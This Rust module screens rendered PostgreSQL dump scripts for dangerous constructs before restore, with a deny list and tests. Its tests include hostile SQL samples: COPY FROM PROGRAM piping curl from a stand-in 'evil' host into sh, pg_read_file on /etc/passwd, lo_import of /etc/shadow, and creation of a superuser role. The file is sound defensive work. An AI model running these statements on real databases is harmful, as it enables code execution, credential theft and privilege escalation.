//! A screen for the SQL a dump will run, applied before `pg_restore` loads it.
//!
//! WHY: `pg_restore` runs the dump's SQL inside the database container as the bundle's PostgreSQL
//! owner, which is a superuser. A dump is code. Restoring a hostile one can read files, run programs
//! (`COPY ... PROGRAM`), change server settings (`ALTER SYSTEM`) or plant code that runs later.
//!
//! WHAT: `pg_restore --no-owner -f -` renders the archive as a SQL script WITHOUT connecting to
//! any database. This module reads that script, skips the data inside `COPY ... FROM stdin` blocks
//! (data is not SQL), and refuses a script that contains constructs a Dynodoc backup never has:
//! program execution, server settings, extensions we do not ship, event triggers, foreign data
//! wrappers, role and session-authorization changes, file and large-object functions, anonymous
//! `DO` blocks, functions in languages other than `sql` and `plpgsql`, COPY to or from files.
//!
//! LIMITS (stated plainly in docs/SELF-HOSTED-OPERATIONS.md): this is a screen, not a sandbox. The
//! real schema has `SECURITY DEFINER` functions and `plpgsql` bodies, so code inside a function body
//! can only be matched by name, and dynamic SQL built at run time cannot be seen. A backup made by
//! someone else is trusted code; restore only backups you made or can account for. The screen
//! catches the crude and the accidental, which is what a damaged or swapped file usually is.

use regex::Regex;
use std::io::BufRead;
use std::sync::OnceLock;

/// Extensions the schema installs (migrations/0000_extensions.sql) plus the built-in `plpgsql`.
pub const ALLOWED_EXTENSIONS: [&str; 3] = ["pgcrypto", "pg_trgm", "plpgsql"];
/// Function languages the schema uses.
pub const ALLOWED_LANGUAGES: [&str; 2] = ["sql", "plpgsql"];
/// Refuse a script whose SQL text (data excluded) is larger than this: nothing legitimate is.
const MAX_SQL_BYTES: usize = 64 * 1024 * 1024;

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Finding {
    pub rule: &'static str,
    pub excerpt: String,
}

struct Rules {
    deny: Vec<(&'static str, Regex)>,
    language: Regex,
    extension: Regex,
    copy_start: Regex,
}

fn rules() -> &'static Rules {
    static R: OnceLock<Rules> = OnceLock::new();
    R.get_or_init(|| {
        let deny = |name: &'static str, pattern: &str| (name, Regex::new(pattern).expect("regex"));
        Rules {
            deny: vec![
                deny("program execution (COPY ... PROGRAM)", r"\bprogram\b"),
                deny("server settings (ALTER SYSTEM)", r"\balter system\b"),
                deny("event trigger", r"\b(create|alter|drop) event trigger\b"),
                deny("foreign data wrapper, server or user mapping", r"\b(create|alter|drop) (foreign data wrapper|foreign table|server|user mapping)\b|\bimport foreign schema\b"),
                deny("publication or subscription", r"\b(create|alter|drop) (publication|subscription)\b"),
                deny("role or user management", r"\b(create|alter|drop) (role|user|group)\b"),
                deny("session authorization", r"\bset (local |session )?(session authorization|role)\b|\breset (session authorization|role)\b"),
                deny("database or tablespace management", r"\b(create|alter|drop) (database|tablespace)\b"),
                deny("language creation", r"\b(create|alter|drop) (or replace )?(trusted )?(procedural )?language\b"),
                deny("file, large-object or server-control function", r"\b(pg_read_file|pg_read_binary_file|pg_ls_dir|pg_stat_file|pg_file_write|pg_file_rename|pg_file_unlink|lo_import|lo_export|lo_from_bytea|pg_terminate_backend|pg_cancel_backend|pg_reload_conf|pg_rotate_logfile|pg_switch_wal|pg_promote|dblink|postgres_fdw|file_fdw|adminpack)\b"),
                deny("anonymous code block (DO)", r"(^|;)\s*do\s+(language\s+\w+\s+)?(\$|')"),
                deny("COPY to a file or from a file", r"\bcopy\b[^;]*\b(to|from)\s+'"),
                deny("COPY TO", r"\bcopy\b[^;]*\bto\b"),
                deny("replica mode (bypasses triggers)", r"\bsession_replication_role\b"),
                deny("server command setting", r"\b(archive_command|restore_command|shared_preload_libraries|session_preload_libraries|local_preload_libraries|dynamic_library_path|ssl_passphrase_command|archive_cleanup_command|recovery_end_command)\b"),
            ],
            language: Regex::new(r"\blanguage\s+'?([a-z0-9_]+)'?").expect("regex"),
            extension: Regex::new(r"\bcreate extension (?:if not exists )?(?:\x22)?([a-z0-9_\-]+)").expect("regex"),
            copy_start: Regex::new(r"(?i)^\s*copy\s+.+\s+from\s+stdin\s*;\s*$").expect("regex"),
        }
    })
}

/// Lowercase, comments removed, whitespace collapsed, double quotes dropped.
fn normalise(sql: &str) -> String {
    static BLOCK: OnceLock<Regex> = OnceLock::new();
    let block = BLOCK.get_or_init(|| Regex::new(r"(?s)/\*.*?\*/").expect("regex"));
    let without_blocks = block.replace_all(sql, " ");
    let mut out = String::with_capacity(without_blocks.len());
    for line in without_blocks.lines() {
        let line = match line.find("--") {
            Some(i) => &line[..i],
            None => line,
        };
        out.push_str(line);
        out.push(' ');
    }
    let lower = out.to_lowercase().replace('"', "");
    lower.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn excerpt(text: &str, at: usize) -> String {
    let start = text[..at]
        .char_indices()
        .rev()
        .nth(30)
        .map(|(i, _)| i)
        .unwrap_or(0);
    let tail = &text[at..];
    let end = at
        + tail
            .char_indices()
            .nth(70)
            .map(|(i, _)| i)
            .unwrap_or(tail.len());
    text[start..end].to_string()
}

/// Screen a rendered script. `Err` only for a script too large to review or unreadable.
pub fn scan_script(reader: impl BufRead) -> Result<Vec<Finding>, String> {
    let r = rules();
    let mut findings = Vec::new();
    let mut sql = String::new();
    let mut in_data = false;
    let mut data_ended = false;
    for line in reader.lines() {
        let line = line.map_err(|e| format!("the rendered dump could not be read: {e}"))?;
        if in_data {
            if line == "\\." {
                in_data = false;
                data_ended = true;
            }
            continue;
        }
        let trimmed = line.trim_start();
        if trimmed.starts_with('\\') {
            // pg_restore (16.10 and later) prints \restrict and \unrestrict around the script.
            if !(trimmed.starts_with("\\restrict ") || trimmed.starts_with("\\unrestrict ")) {
                findings.push(Finding {
                    rule: "psql meta-command in the script",
                    excerpt: trimmed.chars().take(80).collect(),
                });
            }
            continue;
        }
        if r.copy_start.is_match(&line) {
            in_data = true;
            continue;
        }
        sql.push_str(&line);
        sql.push('\n');
        if sql.len() > MAX_SQL_BYTES {
            return Err(format!("the SQL of the dump (data excluded) is larger than {} MiB; nothing legitimate is, so it is not reviewed", MAX_SQL_BYTES >> 20));
        }
    }
    if in_data {
        findings.push(Finding {
            rule: "a COPY data block that never ends (a truncated dump)",
            excerpt: String::new(),
        });
    }
    let _ = data_ended;
    let text = normalise(&sql);
    for (name, re) in &r.deny {
        if let Some(m) = re.find(&text) {
            findings.push(Finding {
                rule: name,
                excerpt: excerpt(&text, m.start()),
            });
        }
    }
    for cap in r.language.captures_iter(&text) {
        let language = &cap[1];
        if !ALLOWED_LANGUAGES.contains(&language) {
            let at = cap.get(0).map(|m| m.start()).unwrap_or(0);
            findings.push(Finding {
                rule: "function language other than sql and plpgsql",
                excerpt: excerpt(&text, at),
            });
        }
    }
    for cap in r.extension.captures_iter(&text) {
        let name = &cap[1];
        if !ALLOWED_EXTENSIONS.contains(&name) {
            let at = cap.get(0).map(|m| m.start()).unwrap_or(0);
            findings.push(Finding {
                rule: "extension Dynodoc does not ship",
                excerpt: excerpt(&text, at),
            });
        }
    }
    findings.dedup();
    Ok(findings)
}

/// One line per distinct rule, for an error message (no data, only the matched SQL fragment).
pub fn summarise(findings: &[Finding]) -> String {
    let mut seen = Vec::new();
    for f in findings {
        if !seen.contains(&f.rule) {
            seen.push(f.rule);
        }
    }
    seen.join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    fn scan(text: &str) -> Vec<Finding> {
        scan_script(Cursor::new(text.as_bytes().to_vec())).unwrap()
    }

    /// What `pg_restore --no-owner -f -` prints for a Dynodoc database, in miniature.
    const LEGIT: &str = "\\restrict abcDEF123\n--\n-- PostgreSQL database dump\n--\nSET statement_timeout = 0;\nSET default_tablespace = '';\nSELECT pg_catalog.set_config('search_path', '', false);\nCREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA public;\nCREATE EXTENSION IF NOT EXISTS pg_trgm WITH SCHEMA public;\nCOMMENT ON EXTENSION pg_trgm IS 'text similarity';\nCREATE TABLE public.event (id text NOT NULL, body jsonb);\nCREATE FUNCTION public.guard() RETURNS trigger\n    LANGUAGE plpgsql SECURITY DEFINER\n    AS $$ BEGIN RAISE EXCEPTION 'append-only'; END $$;\nCREATE FUNCTION public.one() RETURNS integer LANGUAGE sql AS 'select 1';\nCREATE TRIGGER no_update BEFORE UPDATE ON public.event FOR EACH ROW EXECUTE FUNCTION public.guard();\nREVOKE ALL ON FUNCTION public.guard() FROM PUBLIC;\nGRANT SELECT ON TABLE public.event TO dynodoc_runtime;\nALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE ALL ON TABLES FROM PUBLIC;\nCOPY public.event (id, body) FROM stdin;\ne1\t{\"note\": \"ALTER SYSTEM SET archive_command = 'x'; COPY t TO PROGRAM 'id'\"}\n\\.\nSELECT pg_catalog.setval('public.seq', 4, true);\n\\unrestrict abcDEF123\n";

    #[test]
    fn a_real_looking_dynodoc_script_passes_including_words_that_are_only_data() {
        assert_eq!(
            scan(LEGIT),
            vec![],
            "data inside COPY blocks is not SQL and is skipped"
        );
    }

    #[test]
    fn each_dangerous_construct_is_found() {
        for (what, sql) in [
            (
                "program",
                "COPY public.t FROM PROGRAM 'curl http://evil | sh';",
            ),
            (
                "program split over lines and cased",
                "copy t\n  from\n  ProGram\n 'id';",
            ),
            (
                "alter system",
                "ALTER SYSTEM SET archive_command = 'cp %p /tmp';",
            ),
            (
                "alter system with a comment in the middle",
                "ALTER /* hi */ SYSTEM SET x = 1;",
            ),
            ("extension", "CREATE EXTENSION IF NOT EXISTS plpython3u;"),
            ("extension quoted", "CREATE EXTENSION \"dblink\";"),
            (
                "event trigger",
                "CREATE EVENT TRIGGER t ON ddl_command_start EXECUTE FUNCTION f();",
            ),
            ("foreign data", "CREATE FOREIGN DATA WRAPPER w;"),
            (
                "server",
                "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw;",
            ),
            (
                "create role",
                "CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x';",
            ),
            ("alter role", "ALTER ROLE dynodoc_runtime SUPERUSER;"),
            (
                "session authorization",
                "SET SESSION AUTHORIZATION postgres;",
            ),
            ("set role", "SET ROLE postgres;"),
            (
                "c language function",
                "CREATE FUNCTION f() RETURNS int AS '/lib/x.so', 'f' LANGUAGE c;",
            ),
            (
                "internal language",
                "CREATE FUNCTION f() RETURNS text LANGUAGE internal AS 'pg_read_file';",
            ),
            (
                "python function",
                "CREATE FUNCTION f() RETURNS text AS $$ import os $$ LANGUAGE plpython3u;",
            ),
            (
                "quoted language",
                "CREATE FUNCTION f() RETURNS text AS $$ x $$ LANGUAGE 'c';",
            ),
            ("create language", "CREATE LANGUAGE plsh;"),
            ("read file", "SELECT pg_read_file('/etc/passwd');"),
            ("large object", "SELECT lo_import('/etc/shadow');"),
            (
                "terminate",
                "SELECT pg_terminate_backend(pid) FROM pg_stat_activity;",
            ),
            ("do block", "DO $$ BEGIN PERFORM 1; END $$;"),
            (
                "do block with language",
                "DO LANGUAGE plpgsql $$ BEGIN NULL; END $$;",
            ),
            ("copy to file", "COPY public.t TO '/tmp/out';"),
            ("copy to stdout", "COPY public.t TO STDOUT;"),
            ("copy from file", "COPY public.t FROM '/etc/passwd';"),
            ("replica role", "SET session_replication_role = replica;"),
            (
                "preload libraries",
                "SET shared_preload_libraries = 'evil';",
            ),
            ("create database", "CREATE DATABASE other;"),
            ("create tablespace", "CREATE TABLESPACE t LOCATION '/tmp';"),
            ("publication", "CREATE PUBLICATION p FOR ALL TABLES;"),
            ("meta-command", "\\! id"),
            ("meta-command include", "\\i /etc/passwd"),
        ] {
            let found = scan(&format!("SET x = 1;\n{sql}\nSELECT 1;\n"));
            assert!(!found.is_empty(), "{what} was not found in: {sql}");
        }
    }

    #[test]
    fn a_dangerous_statement_cannot_hide_behind_a_copy_line() {
        // The data block starts only on a line that is exactly `COPY ... FROM stdin;`.
        let found = scan("COPY t FROM stdin; ALTER SYSTEM SET x = 1;\nrow\n\\.\n");
        assert!(
            found.iter().any(|f| f.rule.contains("ALTER SYSTEM")),
            "{found:?}"
        );
        let found = scan("ALTER SYSTEM SET x = 1; COPY t FROM stdin;\nrow\n\\.\n");
        assert!(
            found.iter().any(|f| f.rule.contains("ALTER SYSTEM")),
            "{found:?}"
        );
    }

    #[test]
    fn a_data_block_that_never_ends_is_reported() {
        let found = scan("COPY public.t (a) FROM stdin;\n1\n2\n");
        assert!(found.iter().any(|f| f.rule.contains("never ends")));
    }

    #[test]
    fn allowed_extensions_and_languages_are_exactly_the_ones_the_schema_uses() {
        assert!(
            scan("CREATE EXTENSION IF NOT EXISTS pgcrypto;\nCREATE EXTENSION pg_trgm;\n")
                .is_empty()
        );
        assert!(scan("CREATE FUNCTION f() RETURNS int LANGUAGE plpgsql AS $$ BEGIN RETURN 1; END $$;\nCREATE FUNCTION g() RETURNS int LANGUAGE sql AS 'select 1';").is_empty());
        assert_eq!(
            summarise(&scan("ALTER SYSTEM SET a = 1;\nALTER SYSTEM SET b = 2;")),
            "server settings (ALTER SYSTEM)"
        );
    }

    #[test]
    fn the_excerpt_names_the_statement_and_never_contains_row_data() {
        let found = scan("COPY public.event (id) FROM stdin;\nsecret-row-data-123\n\\.\nSELECT pg_read_file('/etc/passwd');\n");
        assert_eq!(found.len(), 1);
        assert!(
            found[0].excerpt.contains("pg_read_file")
                && !found[0].excerpt.contains("secret-row-data")
        );
    }

    #[test]
    fn an_enormous_script_is_refused_as_too_large() {
        struct Endless;
        impl std::io::Read for Endless {
            fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
                for b in buf.iter_mut() {
                    *b = b'x';
                }
                if let Some(last) = buf.last_mut() {
                    *last = b'\n';
                }
                Ok(buf.len())
            }
        }
        let err = scan_script(std::io::BufReader::new(Endless)).unwrap_err();
        assert!(err.contains("larger than"), "{err}");
    }
}
